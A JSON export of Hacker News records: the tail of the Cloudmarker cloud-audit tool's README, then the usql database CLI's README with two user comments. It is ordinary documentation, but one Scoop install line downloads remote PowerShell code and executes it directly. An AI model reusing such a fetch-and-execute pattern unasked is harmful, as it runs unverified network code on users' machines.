can be extended by writing plugins. However, Cloudmarker also comes bundled with a default set of plugins that can be used as is without writing a single line of code. Here is a brief overview of the features that come bundled with Cloudmarker: Perform scheduled or ad hoc audits of cloud environment. Retrieve data from Azure and GCP. Store or index retrieved data in Elasticsearch, MongoDB, Splunk, and the file system. Look for insecure firewall rules and generate firewall rule events. Look for unencrypted disks (Azure only) and generate events. Send alerts for events via email and Slack as well as save alerts in one of the supported storage or indexing engines (see the third point above). Normalize firewall rules from Azure and GCP which are in different formats to a common object model (\"com\") so that a single query or event rule can search for or detect issues in firewall rules from both clouds. Wishlist Add more event plugins to detect different types of insecure configuration. Normalize other types of data into a common object model (\"com\") just like we do right now for firewall rules. Install Perform the following steps to set up Cloudmarker. Create a virtual Python environment and install Cloudmarker in it: python3 -m venv venv . venv/bin/activate pip3 install cloudmarker Run sanity test: The above command runs a mock audit with mock plugins that generate some mock data. The mock data generated can be found at /tmp/cloudmarker/. Logs from the tool are written to the standard output as well as to /tmp/cloudmarker.log. The -n or --now option tells Cloudmarker to run right now instead of waiting for a scheduled run. To learn how to configure and use Cloudmarker with Azure or GCP clouds, see Cloudmarker Tutorial. Develop This section describes how to set up a development environment for Cloudmarker. This section is useful for those who would like to contribute to Cloudmarker or run Cloudmarker directly from its source. We use primarily three tools to perform development on this project: Python 3, Git, and Make. Your system may already have these tools. But if not, here are some brief instructions on how they can be installed. On macOS, if you have Homebrew installed, then these tools can be be installed easily with the following command: On a Debian GNU/Linux system or in another Debian-based Linux distribution, they can be installed with the following commands: apt-get update apt-get install python3 python3-venv git make On a CentOS Linux distribution, they can be installed with these commands: yum install centos-release-scl yum install git make rh-python36 scl enable rh-python36 bash Note: The scl enable command starts a new shell for you to use Python 3. On any other system, we hope you can figure out how to install these tools yourself. Clone the project repository and enter its top-level directory: git clone https://github.com/cloudmarker/cloudmarker.git cd cloudmarker Create a virtual Python environment for development purpose: This creates a virtual Python environment at ~/.venv/cloudmarker. Additionally, it also creates a convenience script named venv in the current directory to easily activate the virtual Python environment which we will soon see in the next point. To undo this step at anytime in future, i.e., delete the virtual Python environment directory, either enter rm -rf venv ~/.venv/cloudmarker or enter make rmvenv. Activate the virtual Python environment: In the top-level directory of the project, enter this command: python3 -m cloudmarker -n This generates mock data at /tmp/cloudmarker. This step serves as a sanity check that ensures that the development environment is correctly set up and that the Cloudmarker audit framework is running properly. Now that the project is set up correctly, you can create a cloudmarker.yaml to configure Cloudmarker to scan/audit your cloud or you can perform more development on the Cloudmarker source code. See Cloudmarker Tutorial for more details. If you have set up a development environment to perform more development on Cloudmarker, please consider sending a pull request to us if you think your development work would be useful to the community. Before sending a pull request, please run the unit tests, code coverage, linters, and document generator to ensure that no existing test has been broken and the pull request adheres to our coding conventions: make test make coverage make lint make docs To run these four targets in one shot, enter this \"shortcut\" target: Open htmlcov/index.html with a web browser to view the code coverage report. Open docs/_build/html/index.html with a web browser to view the generated documentation. Resources Here is a list of useful links about this project: Documentation on Read The Docs Latest release on PyPI Source code on GitHub Issue tracker on GitHub Changelog on GitHub Cloudmarker channel on Slack Invitation to Cloudmarker channel on Slack Support To report bugs, suggest improvements, or ask questions, please create a new issue at http://github.com/cloudmarker/cloudmarker/issues. License This is free software. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of it, under the terms of the MIT License. See LICENSE.rst for the complete license. This software is provided WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See LICENSE.rst for the complete disclaimer. ",
        "_version_": 1718527404339625984
      },
      {
        "story_id": [21509373],
        "story_author": ["nexuist"],
        "story_descendants": [26],
        "story_score": [147],
        "story_time": ["2019-11-11T22:02:51Z"],
        "story_title": "Usql – A Universal CLI for Databases",
        "search": [
          "Usql – A Universal CLI for Databases",
          "https://github.com/xo/usql",
          "Installing | Building | Using | Database Support | Features and Compatibility | Releases | Contributing usql is a universal command-line interface for PostgreSQL, MySQL, Oracle Database, SQLite3, Microsoft SQL Server, and many other databases including NoSQL and non-relational databases! usql provides a simple way to work with SQL and NoSQL databases via a command-line inspired by PostgreSQL's psql. usql supports most of the core psql features, such as variables, backticks, and commands and has additional features that psql does not, such as syntax highlighting, context-based completion, and multiple database support. Database administrators and developers that would prefer to work with a tool like psql with non-PostgreSQL databases, will find usql intuitive, easy-to-use, and a great replacement for the command-line clients/tools for other databases. Installing usql can be installed via Release, via Homebrew, via Scoop or via Go: Installing via Release Download a release for your platform Extract the usql or usql.exe file from the .tar.bz2 or .zip file Move the extracted executable to somewhere on your $PATH (Linux/macOS) or %PATH% (Windows) macOS Notes The recommended installation method on macOS is via brew (see below). If the following or similar error is encountered when attempting to run usql: $ usql dyld: Library not loaded: /usr/local/opt/icu4c/lib/libicuuc.68.dylib Referenced from: /Users/user/.local/bin/usql Reason: image not found Abort trap: 6 Then the ICU lib needs to be installed. This can be accomplished using brew: Installing via Homebrew (macOS and Linux) usql is available in the xo/xo tap, and can be installed in the usual way with the brew command: # install usql with \"most\" drivers $ brew install xo/xo/usql Additional support for ODBC databases can be installed by passing --with-odbc option during install: # install usql with odbc support $ brew install --with-odbc usql Installing via Scoop (Windows) usql can be installed using Scoop: # install scoop if not already installed iex (new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install usql Installing via Go usql can be installed in the usual Go fashion: # install usql from master branch with basic database support # includes PostgreSQL, Oracle Database, MySQL, MS SQL, and SQLite3 drivers $ go install github.com/xo/usql@master Building When building usql with Go, only drivers for PostgreSQL, MySQL, SQLite3 and Microsoft SQL Server will be enabled by default. Other databases can be enabled by specifying the build tag for their database driver. Additionally, the most and all build tags include most, and all SQL drivers, respectively: # install all drivers $ go install -tags all github.com/xo/usql@master # install with most drivers (excludes unsupported drivers) $ go install -tags most github.com/xo/usql@master # install with base drivers and additional support for Oracle Database and ODBC $ go install -tags 'godror odbc' github.com/xo/usql@master For every build tag <driver>, there is also a no_<driver> build tag disabling the driver: # install all drivers excluding avatica and couchbase $ go install -tags 'all no_avatica no_couchbase' github.com/xo/usql@master Release Builds Release builds are built with the most build tag. Additional SQLite3 build tags are also specified for releases. Embedding An effort has been made to keep usql's packages modular, and reusable by other developers wishing to leverage the usql code base. As such, it is possible to embed or create a SQL command-line interface (e.g, for use by some other project as an \"official\" client) using the core usql source tree. Please refer to main.go to see how usql puts together its packages. usql's code is also well-documented -- please refer to the Go reference for an overview of the various packages and APIs. Database Support usql works with all Go standard library compatible SQL drivers supported by github.com/xo/dburl. The list of drivers that usql was built with can be displayed using the \\drivers command: $ cd $GOPATH/src/github.com/xo/usql $ export GO111MODULE=on # build excluding the base drivers, and including cassandra and moderncsqlite $ go build -tags 'no_postgres no_oracle no_sqlserver no_sqlite3 cassandra moderncsqlite' # show built driver support $ ./usql -c '\\drivers' Available Drivers: cql [ca, scy, scylla, datastax, cassandra] memsql (mysql) [me] moderncsqlite [mq, sq, file, sqlite, sqlite3, modernsqlite] mysql [my, maria, aurora, mariadb, percona] tidb (mysql) [ti] vitess (mysql) [vt] The above shows that usql was built with only the mysql, cassandra (ie, cql), and moderncsqlite drivers. The output above reflects information about the drivers available to usql, specifically the internal driver name, its primary URL scheme, the driver's available scheme aliases (shown in [...]), and the real/underlying driver (shown in (...)) for wire compatible drivers. Supported Database Schemes and Aliases The following are the Go SQL drivers that usql supports, the associated database, scheme / build tag, and scheme aliases: Database Scheme / Tag Scheme Aliases Driver Package / Notes Microsoft SQL Server sqlserver ms, mssql github.com/denisenkom/go-mssqldb MySQL mysql my, maria, aurora, mariadb, percona github.com/go-sql-driver/mysql Oracle Database oracle or, ora, oci, oci8, odpi, odpi-c github.com/sijms/go-ora/v2 PostgreSQL postgres pg, pgsql, postgresql github.com/lib/pq SQLite3 sqlite3 sq, file, sqlite github.com/mattn/go-sqlite3 Alibaba MaxCompute maxcompute mc sqlflow.org/gomaxcompute Apache Avatica avatica av, phoenix github.com/apache/calcite-avatica-go/v5 Apache H2 h2 github.com/jmrobles/h2go Apache Ignite ignite ig, gridgain github.com/amsokol/ignite-go-client/sql AWS Athena athena s3, aws github.com/uber/athenadriver/go Cassandra cassandra ca, scy, scylla, datastax, cql github.com/MichaelS11/go-cql-driver ClickHouse clickhouse ch github.com/ClickHouse/clickhouse-go Couchbase couchbase n1, n1ql github.com/couchbase/go_n1ql CSVQ csvq cs, csv, tsv, json github.com/mithrandie/csvq-driver Cznic QL ql cznic, cznicql modernc.org/ql Exasol exasol ex, exa github.com/exasol/exasol-driver-go Firebird firebird fb, firebirdsql github.com/nakagami/firebirdsql Genji genji gj github.com/genjidb/genji/driver Google BigQuery bigquery bq gorm.io/driver/bigquery/driver Google Spanner spanner sp github.com/cloudspannerecosystem/go-sql-spanner Microsoft ADODB adodb ad, ado github.com/mattn/go-adodb ModernC SQLite3 moderncsqlite mq, modernsqlite modernc.org/sqlite MySQL MyMySQL mymysql zm, mymy github.com/ziutek/mymysql/godrv Netezza netezza nz, nzgo github.com/IBM/nzgo PostgreSQL PGX pgx px github.com/jackc/pgx/v4/stdlib Presto presto pr, prs, prestos, prestodb, prestodbs github.com/prestodb/presto-go-client/presto SAP ASE sapase ax, ase, tds github.com/thda/tds SAP HANA saphana sa, sap, hana, hdb github.com/SAP/go-hdb/driver Trino trino tr, trs, trinos github.com/trinodb/trino-go-client/trino Vertica vertica ve github.com/vertica/vertica-sql-go VoltDB voltdb vo, vdb, volt github.com/VoltDB/voltdb-client-go/voltdbclient Apache Hive hive hi sqlflow.org/gohive Apache Impala impala im github.com/bippio/go-impala Azure CosmosDB cosmos cm github.com/btnguyen2k/gocosmos GO DRiver for ORacle godror gr github.com/godror/godror ODBC odbc od github.com/alexbrainman/odbc Snowflake snowflake sf github.com/snowflakedb/gosnowflake Amazon Redshift postgres rs, redshift github.com/lib/pq CockroachDB postgres cr, cdb, crdb, cockroach, cockroachdb github.com/lib/pq OLE ODBC adodb oo, ole, oleodbc github.com/mattn/go-adodb SingleStore MemSQL mysql me, memsql github.com/go-sql-driver/mysql TiDB mysql ti, tidb github.com/go-sql-driver/mysql Vitess Database mysql vt, vitess github.com/go-sql-driver/mysql NO DRIVERS no_base no base drivers (useful for development) MOST DRIVERS most all stable drivers ALL DRIVERS all all drivers NO <TAG> no_<tag> exclude driver with <tag> Requires CGO Wire compatible (see respective driver) Any of the protocol schemes/aliases shown above can be used in conjunction when connecting to a database via the command-line or with the \\connect command: # connect to a vitess database: $ usql vt://user:pass@host:3306/mydatabase $ usql (not connected)=> \\c vitess://user:pass@host:3306/mydatabase See the section below on connecting to databases for further details building DSNs/URLs for use with usql. Using After installing, usql can be used similarly to the following: # connect to a postgres database $ usql postgres://booktest@localhost/booktest # connect to an oracle database $ usql oracle://user:pass@host/oracle.sid # connect to a postgres database and run the commands contained in script.sql $ usql pg://localhost/ -f script.sql Command-line Options Supported command-line options: $ usql --help usql, the universal command-line interface for SQL databases Usage: usql [OPTIONS]... [DSN] Arguments: DSN database url Options: -c, --command=COMMAND ... run only single command (SQL or internal) and exit -f, --file=FILE ... execute commands from file and exit -w, --no-password never prompt for password -X, --no-rc do not read start up file -o, --out=OUT output file -W, --password force password prompt (should happen automatically) -1, --single-transaction execute as a single transaction (if non-interactive) -v, --set=, --variable=NAME=VALUE ... set variable NAME to VALUE -P, --pset=VAR[=ARG] ... set printing option VAR to ARG (see \\pset command) -F, --field-separator=FIELD-SEPARATOR ... field separator for unaligned output (default, \"|\") -R, --record-separator=RECORD-SEPARATOR ... record separator for unaligned output (default, \\n) -T, --table-attr=TABLE-ATTR ... set HTML table tag attributes (e.g., width, border) -A, --no-align unaligned table output mode -H, --html HTML table output mode -t, --tuples-only print rows only -x, --expanded turn on expanded table output -z, --field-separator-zero set field separator for unaligned output to zero byte -0, --record-separator-zero set record separator for unaligned output to zero byte -J, --json JSON output mode -C, --csv CSV output mode -G, --vertical vertical output mode -V, --version display version and exit Connecting to Databases usql opens a database connection by parsing a URL and passing the resulting connection string to a database driver. Database connection strings (aka \"data source name\" or DSNs) have the same parsing rules as URLs, and can be passed to usql via command-line, or to the \\connect or \\c commands. Connection strings look like the following: driver+transport://user:pass@host/dbname?opt1=a&opt2=b driver:/path/to/file /path/to/file Where the above are: Component Description driver driver scheme name or scheme alias transport tcp, udp, unix or driver name (for ODBC and ADODB) user username pass password host hostname dbname database name, instance, or service name/ID ?opt1=a&... additional database driver options (see respective SQL driver for available options) /path/to/file a path on disk Some databases, such as Microsoft SQL Server, or Oracle Database support a path component (ie, /dbname) in the form of /instance/dbname, where /instance is the optional service identifier (aka \"SID\") or database instance Driver Aliases usql supports the same driver names and aliases from the dburl package. Most databases have at least one or more alias - please refer to the dburl documentation for all supported aliases. Short Aliases All database drivers have a two character short form that is usually the first two letters of the database driver. For example, pg for postgres, my for mysql, ms for sqlserver (formerly known as mssql), or for oracle, or sq for sqlite3. Passing Driver Options Driver options are specified as standard URL query options in the form of ?opt1=a&obt2=b. Please refer to the relevant database driver's documentation for available options. Paths on Disk If a URL does not have a driver: scheme, usql will check if it is a path on disk. If the path exists, usql will attempt to use an appropriate database driver to open the path. If the specified path is a Unix Domain Socket, usql will attempt to open it using the MySQL driver. If the path is a directory, usql will attempt to open it using the PostgreSQL driver. If the path is a regular file, usql will attempt to open the file using the SQLite3 driver. Driver Defaults As with URLs, most components in the URL are optional and many components can be left out. usql will attempt connecting using defaults where possible: # connect to postgres using the local $USER and the unix domain socket in /var/run/postgresql $ usql pg:// Please see documentation for the database driver you are connecting with for more information. Connection Examples The following are example connection strings and additional ways to connect to databases using usql: # connect to a postgres database $ usql pg://user:pass@host/dbname $ usql pgsql://user:pass@host/dbname $ usql postgres://user:pass@host:port/dbname $ usql pg:// $ usql /var/run/postgresql $ usql pg://user:pass@host/dbname?sslmode=disable # Connect without SSL # connect to a mysql database $ usql my://user:pass@host/dbname $ usql mysql://user:pass@host:port/dbname $ usql my:// $ usql /var/run/mysqld/mysqld.sock # connect to a sqlserver database $ usql sqlserver://user:pass@host/instancename/dbname $ usql ms://user:pass@host/dbname $ usql ms://user:pass@host/instancename/dbname $ usql mssql://user:pass@host:port/dbname $ usql ms:// # connect to a sqlserver database using Windows domain authentication $ runas /user:ACME\\wiley /netonly \"usql mssql://host/dbname/\" # connect to a oracle database $ usql or://user:pass@host/sid $ usql oracle://user:pass@host:port/sid $ usql or:// # connect to a cassandra database $ usql ca://user:pass@host/keyspace $ usql cassandra://host/keyspace $ usql cql://host/ $ usql ca:// # connect to a sqlite database that exists on disk $ usql dbname.sqlite3 # NOTE: when connecting to a SQLite database, if the \"<driver>://\" or # \"<driver>:\" scheme/alias is omitted, the file must already exist on disk. # # if the file does not yet exist, the URL must incorporate file:, sq:, sqlite3:, # or any other recognized sqlite3 driver alias to force usql to create a new, # empty database at the specified path: $ usql sq://path/to/dbname.sqlite3 $ usql sqlite3://path/to/dbname.sqlite3 $ usql file:/path/to/dbname.sqlite3 # connect to a adodb ole resource (windows only) $ usql adodb://Microsoft.Jet.OLEDB.4.0/myfile.mdb $ usql \"adodb://Microsoft.ACE.OLEDB.12.0/?Extended+Properties=\\\"Text;HDR=NO;FMT=Delimited\\\"\" # connect with ODBC driver (requires building with odbc tag) $ cat /etc/odbcinst.ini [DB2] Description=DB2 driver Driver=/opt/db2/clidriver/lib/libdb2.so FileUsage = 1 DontDLClose = 1 [PostgreSQL ANSI] Description=PostgreSQL ODBC driver (ANSI version) Driver=psqlodbca.so Setup=libodbcpsqlS.so Debug=0 CommLog=1 UsageCount=1 # connect to db2, postgres databases using ODBC $ usql odbc+DB2://user:pass@localhost/dbname $ usql odbc+PostgreSQL+ANSI://user:pass@localhost/dbname?TraceFile=/path/to/trace.log Executing Queries and Commands The interactive intrepreter reads queries and meta (\\ ) commands, sending the query to the connected database: $ usql sqlite://example.sqlite3 Connected with driver sqlite3 (SQLite3 3.17.0) Type \"help\" for help. sq:example.sqlite3=> create table test (test_id int, name string); CREATE TABLE sq:example.sqlite3=> insert into test (test_id, name) values (1, 'hello'); INSERT 1 sq:example.sqlite3=> select * from test; test_id | name +---------+-------+ 1 | hello (1 rows) sq:example.sqlite3=> select * from test sq:example.sqlite3-> \\p select * from test sq:example.sqlite3-> \\g test_id | name +---------+-------+ 1 | hello (1 rows) sq:example.sqlite3=> \\c postgres://booktest@localhost error: pq: 28P01: password authentication failed for user \"booktest\" Enter password: Connected with driver postgres (PostgreSQL 9.6.6) pg:booktest@localhost=> select * from authors; author_id | name +-----------+----------------+ 1 | Unknown Master 2 | blah 3 | aoeu (3 rows) pg:booktest@localhost=> Commands may accept one or more parameter, and can be quoted using either ' or \". Command parameters may also be backtick'd. Backslash Commands Currently available commands: $ usql Type \"help\" for help. (not connected)=> \\? General \\q quit usql \\copyright show usql usage and distribution terms \\drivers display information about available database drivers Query Execute \\g [(OPTIONS)] [FILE] or ; execute query (and send results to file or |pipe) \\crosstabview [(OPTIONS)] [COLUMNS] execute query and display results in crosstab \\G [(OPTIONS)] [FILE] as \\g, but forces vertical output mode \\gexec execute query and execute each value of the result \\gset [PREFIX] execute query and store results in usql variables \\gx [(OPTIONS)] [FILE] as \\g, but forces expanded output mode \\watch [(OPTIONS)] [DURATION] execute query every specified interval Query Buffer \\e [FILE] [LINE] edit the query buffer (or file) with external editor \\p show the contents of the query buffer \\raw show the raw (non-interpolated) contents of the query buffer \\r reset (clear) the query buffer \\w FILE write query buffer to file Help \\? [commands] show help on backslash commands \\? options show help on usql command-line options \\? variables show help on special variables Input/Output \\echo [-n] [STRING] write string to standard output (-n for no newline) \\qecho [-n] [STRING] write string to \\o output stream (-n for no newline) \\warn [-n] [STRING] write string to standard error (-n for no newline) \\o [FILE] send all query results to file or |pipe \\i FILE execute commands from file \\ir FILE as \\i, but relative to location of current script Informational \\d[S+] [NAME] list tables, views, and sequences or describe table, view, sequence, or index \\da[S+] [PATTERN] list aggregates \\df[S+] [PATTERN] list functions \\di[S+] [PATTERN] list indexes \\dm[S+] [PATTERN] list materialized views \\dn[S+] [PATTERN] list schemas \\ds[S+] [PATTERN] list sequences \\dt[S+] [PATTERN] list tables \\dv[S+] [PATTERN] list views \\l[+] list databases \\ss[+] [TABLE|QUERY] [k] show stats for a table or a query Formatting \\pset [NAME [VALUE]] set table output option \\a toggle between unaligned and aligned output mode \\C [STRING] set table title, or unset if none \\f [STRING] show or set field separator for unaligned query output \\H toggle HTML output mode \\T [STRING] set HTML <table> tag attributes, or unset if none \\t [on|off] show only rows \\x [on|off|auto] toggle expanded output Transaction \\begin begin a transaction \\commit commit current transaction \\rollback rollback (abort) current transaction Connection \\c URL connect to database with url \\c DRIVER PARAMS... connect to database with SQL driver and parameters \\Z close database connection \\password [USERNAME] change the password for a user \\conninfo display information about the current database connection Operating System \\cd [DIR] change the current working directory \\setenv NAME [VALUE] set or unset environment variable \\! [COMMAND] execute command in shell or start interactive shell \\timing [on|off] toggle timing of commands Variables \\prompt [-TYPE] <VAR> [PROMPT] prompt user to set variable \\set [NAME [VALUE]] set internal variable, or list all if no parameters \\unset NAME unset (delete) internal variable Features and Compatibility The usql project's goal is to support all standard psql commands and features. Pull Requests are always appreciated! Variables and Interpolation usql supports client-side interpolation of variables that can be \\set and \\unset: $ usql (not connected)=> \\set (not connected)=> \\set FOO bar (not connected)=> \\set FOO = 'bar' (not connected)=> \\unset FOO (not connected)=> \\set (not connected)=> A \\set variable, NAME, will be directly interpolated (by string substitution) into the query when prefixed with : and optionally surrounded by quotation marks (' or \"): pg:booktest@localhost=> \\set FOO bar pg:booktest@localhost=> select * from authors where name = :'FOO'; author_id | name +-----------+------+ 7 | bar (1 rows) The three forms, :NAME, :'NAME', and :\"NAME\", are used to interpolate a variable in parts of a query that may require quoting, such as for a column name, or when doing concatenation in a query: pg:booktest@localhost=> \\set TBLNAME authors pg:booktest@localhost=> \\set COLNAME name pg:booktest@localhost=> \\set FOO bar pg:booktest@localhost=> select * from :TBLNAME where :\"COLNAME\" = :'FOO' pg:booktest@localhost-> \\p select * from authors where \"name\" = 'bar' pg:booktest@localhost-> \\raw select * from :TBLNAME where :\"COLNAME\" = :'FOO' pg:booktest@localhost-> \\g author_id | name +-----------+------+ 7 | bar (1 rows) pg:booktest@localhost=> Note: variables contained within other strings will NOT be interpolated: pg:booktest@localhost=> select ':FOO'; ?column? +----------+ :FOO (1 rows) pg:booktest@localhost=> \\p select ':FOO'; pg:booktest@localhost=> Backtick'd parameters Meta (\\ ) commands support backticks on parameters: (not connected)=> \\echo Welcome `echo $USER` -- 'currently:' \"(\" `date` \")\" Welcome ken -- currently: ( Wed Jun 13 12:10:27 WIB 2018 ) (not connected)=> Backtick'd parameters will be passed to the user's SHELL, exactly as written, and can be combined with \\set: pg:booktest@localhost=> \\set MYVAR `date` pg:booktest@localhost=> \\set MYVAR = 'Wed Jun 13 12:17:11 WIB 2018' pg:booktest@localhost=> \\echo :MYVAR Wed Jun 13 12:17:11 WIB 2018 pg:booktest@localhost=> Passwords usql supports reading passwords for databases from a .usqlpass file contained in the user's HOME directory at startup: $ cat $HOME/.usqlpass # format is: # protocol:host:port:dbname:user:pass postgres:*:*:*:booktest:booktest $ usql pg:// Connected with driver postgres (PostgreSQL 9.6.9) Type \"help\" for help. pg:booktest@=> Note: the .usqlpass file cannot be readable by other users. Please set the permissions accordingly: Runtime Configuration (RC) File usql supports executing a .usqlrc contained in the user's HOME directory: $ cat $HOME/.usqlrc \\echo WELCOME TO THE JUNGLE `date` \\set SYNTAX_HL_STYLE paraiso-dark $ usql WELCOME TO THE JUNGLE Thu Jun 14 02:36:53 WIB 2018 Type \"help\" for help. (not connected)=> \\set SYNTAX_HL_STYLE = 'paraiso-dark' (not connected)=> The .usqlrc file is read by usql at startup in the same way as a file passed on the command-line with -f / --file. It is commonly used to set startup environment variables and settings. You can temporarily disable the RC-file by passing -X or --no-rc on the command-line: Host Connection Information By default, usql displays connection information when connecting to a database. This might cause problems with some databases or connections. This can be disabled by setting the system environment variable USQL_SHOW_HOST_INFORMATION to false: $ export USQL_SHOW_HOST_INFORMATION=false $ usql pg://booktest@localhost Type \"help\" for help. pg:booktest@=> SHOW_HOST_INFORMATION is a standard usql variable, and can be \\set or \\unset. Additionally, it can be passed via the command-line using -v or --set: $ usql --set SHOW_HOST_INFORMATION=false pg:// Type \"help\" for help. pg:booktest@=> \\set SHOW_HOST_INFORMATION true pg:booktest@=> \\connect pg:// Connected with driver postgres (PostgreSQL 9.6.9) pg:booktest@=> Syntax Highlighting Interactive queries will be syntax highlighted by default, using Chroma. There are a number of variables that control syntax highlighting: Variable Default Values Description SYNTAX_HL true true or false enables syntax highlighting SYNTAX_HL_FORMAT dependent on terminal support formatter name Chroma formatter name SYNTAX_HL_OVERRIDE_BG true true or false enables overriding the background color of the chroma styles SYNTAX_HL_STYLE monokai style name Chroma style name Time Formatting Some databases support time/date columns that support formatting. By default, usql formats time/date columns as RFC3339Nano, and can be set using \\pset time <FORMAT>: $ usql pg:// Connected with driver postgres (PostgreSQL 13.2 (Debian 13.2-1.pgdg100+1)) Type \"help\" for help. pg:postgres@=> \\pset time RFC3339Nano pg:postgres@=> select now(); now ----------------------------- 2021-05-01T22:21:44.710385Z (1 row) pg:postgres@=> \\pset time Kitchen Time display is \"Kitchen\" (\"3:04PM\"). pg:postgres@=> select now(); now --------- 10:22PM (1 row) pg:postgres@=> Any Go supported time format or the standard Go const name (for example, Kitchen, in the above). Constants Constant Name Value ANSIC Mon Jan _2 15:04:05 2006 UnixDate Mon Jan _2 15:04:05 MST 2006 RubyDate Mon Jan 02 15:04:05 -0700 2006 RFC822 02 Jan 06 15:04 MST RFC822Z 02 Jan 06 15:04 -0700 RFC850 Monday, 02-Jan-06 15:04:05 MST RFC1123 Mon, 02 Jan 2006 15:04:05 MST RFC1123Z Mon, 02 Jan 2006 15:04:05 -0700 RFC3339 2006-01-02T15:04:05Z07:00 RFC3339Nano 2006-01-02T15:04:05.999999999Z07:00 Kitchen 3:04PM Stamp Jan _2 15:04:05 StampMilli Jan _2 15:04:05.000 StampMicro Jan _2 15:04:05.000000 StampNano Jan _2 15:04:05.000000000 Copy usql implements the \\copy command that reads data from a database connection and writes it into another one. It requires 4 parameters: source connection string destination connection string source query destination table name, optionally with columns Connection strings support same syntax as in \\connect. Source query needs to be quoted. Source query must select same number of columns and in same order as they're defined in the destination table, unless they're specified for the destination, as table_name(column1, column2, ...). Quote the whole expression, if it contains spaces. \\copy does not attempt to perform any data type conversion. Use CAST in the source query to ensure data types compatible with destination table. Some drivers may have limited data type support, and they might not work at all when combined with other limited drivers. Unlike psql, \\copy in usql cannot read data directly from files. Drivers like csvq can help with this, since they support reading CSV and JSON files. $ cat books.csv book_id,author_id,isbn,title,year,available,tags 3,1,3,one,2018,\"2018-06-01 00:00:00\",{} 4,2,4,two,2019,\"2019-06-01 00:00:00\",{} $ usql -c \"\\copy csvq://. sqlite3://test.db 'select * from books' 'books'\" Copied 2 rows Note that it might be a better idea to use tools dedicated to the destination database to load data in a robust way. \\copy reads data from plain SELECT queries. Most drivers that have \\copy enabled use INSERT statements, except for PostgreSQL ones, which use COPY TO. Because data needs to be downloaded from one database and uploaded into another, don't expect same performance as in psql. For loading large amount of data efficiently, use tools native to the destination database. You can use \\copy with variables. Better yet, put those \\set commands in your runtime configuration file at $HOME/.usqlrc and passwords at $HOME/.usqlpass. $ usql Type \"help\" for help. (not connected)=> \\set pglocal postgres://postgres@localhost:49153?sslmode=disable (not connected)=> \\set oralocal godror://system@localhost:1521/orasid (not connected)=> \\copy :pglocal :oralocal 'select staff_id, first_name from staff' 'staff(staff_id, first_name)' Contributing usql is currently a WIP, and is aiming towards a 1.0 release soon. Well-written PRs are always welcome -- and there is a clear backlog of issues marked help wanted on the GitHub issue tracker! Please pick up an issue today, and submit a PR tomorrow! For more technical details, see CONTRIBUTING.md. Related Projects dburl - Go package providing a standard, URL-style mechanism for parsing and opening database connection URLs xo - Go command-line tool to generate Go code from a database schema ",
          "I have been looking for a faster alternative to pgcli [1] ( with  features like auto-complete for table names and columns) and was getting excited.<p>Sadly this is \"just\" a plain old CLI.<p>Also: had to install with `go get -tags \"no_sqlite3\" -u github.com/xo/usql` since the sqlite3 package did not build.<p>[1] <a href=\"https://www.pgcli.com/\" rel=\"nofollow\">https://www.pgcli.com/</a>",
          "I was really hoping for \\dt but looks like they haven't implemented it yet. The number one most common thing I look up when I'm using a SQL variant is how to show the tables. I suppose there would be complications with NoSQL but you could just show available collections or whatever else it maps to in that case."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/xo/usql",
        "comments.comment_id": [21509885, 21509956],
        "comments.comment_author": ["the_duke", "lwb"],
        "comments.comment_descendants": [1, 1],
        "comments.comment_time": [
          "2019-11-11T23:05:33Z",
          "2019-11-11T23:14:50Z"
        ],
        "comments.comment_text": [
          "I have been looking for a faster alternative to pgcli [1] ( with  features like auto-complete for table names and columns) and was getting excited.<p>Sadly this is \"just\" a plain old CLI.<p>Also: had to install with `go get -tags \"no_sqlite3\" -u github.com/xo/usql` since the sqlite3 package did not build.<p>[1] <a href=\"https://www.pgcli.com/\" rel=\"nofollow\">https://www.pgcli.com/</a>",
          "I was really hoping for \\dt but looks like they haven't implemented it yet. The number one most common thing I look up when I'm using a SQL variant is how to show the tables. I suppose there would be complications with NoSQL but you could just show available collections or whatever else it maps to in that case."
        ],
        "id": "b47c3b5f-8ece-4672-a356-0c9ef2a71abc",
        "url_text": "Installing | Building | Using | Database Support | Features and Compatibility | Releases | Contributing usql is a universal command-line interface for PostgreSQL, MySQL, Oracle Database, SQLite3, Microsoft SQL Server, and many other databases including NoSQL and non-relational databases! usql provides a simple way to work with SQL and NoSQL databases via a command-line inspired by PostgreSQL's psql. usql supports most of the core psql features, such as variables, backticks, and commands and has additional features that psql does not, such as syntax highlighting, context-based completion, and multiple database support. Database administrators and developers that would prefer to work with a tool like psql with non-PostgreSQL databases, will find usql intuitive, easy-to-use, and a great replacement for the command-line clients/tools for other databases. Installing usql can be installed via Release, via Homebrew, via Scoop or via Go: Installing via Release Download a release for your platform Extract the usql or usql.exe file from the .tar.bz2 or .zip file Move the extracted executable to somewhere on your $PATH (Linux/macOS) or %PATH% (Windows) macOS Notes The recommended installation method on macOS is via brew (see below). If the following or similar error is encountered when attempting to run usql: $ usql dyld: Library not loaded: /usr/local/opt/icu4c/lib/libicuuc.68.dylib Referenced from: /Users/user/.local/bin/usql Reason: image not found Abort trap: 6 Then the ICU lib needs to be installed. This can be accomplished using brew: Installing via Homebrew (macOS and Linux) usql is available in the xo/xo tap, and can be installed in the usual way with the brew command: # install usql with \"most\" drivers $ brew install xo/xo/usql Additional support for ODBC databases can be installed by passing --with-odbc option during install: # install usql with odbc support $ brew install --with-odbc usql Installing via Scoop (Windows) usql can be installed using Scoop: # install scoop if not already installed iex (new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install usql Installing via Go usql can be installed in the usual Go fashion: # install usql from master branch with basic database support # includes PostgreSQL, Oracle Database, MySQL, MS SQL, and SQLite3 drivers $ go install github.com/xo/usql@master Building When building usql with Go, only drivers for PostgreSQL, MySQL, SQLite3 and Microsoft SQL Server will be enabled by default. Other databases can be enabled by specifying the build tag for their database driver. Additionally, the most and all build tags include most, and all SQL drivers, respectively: # install all drivers $ go install -tags all github.com/xo/usql@master # install with most drivers (excludes unsupported drivers) $ go install -tags most github.com/xo/usql@master # install with base drivers and additional support for Oracle Database and ODBC $ go install -tags 'godror odbc' github.com/xo/usql@master For every build tag <driver>, there is also a no_<driver> build tag disabling the driver: # install all drivers excluding avatica and couchbase $ go install -tags 'all no_avatica no_couchbase' github.com/xo/usql@master Release Builds Release builds are built with the most build tag. Additional SQLite3 build tags are also specified for releases. Embedding An effort has been made to keep usql's packages modular, and reusable by other developers 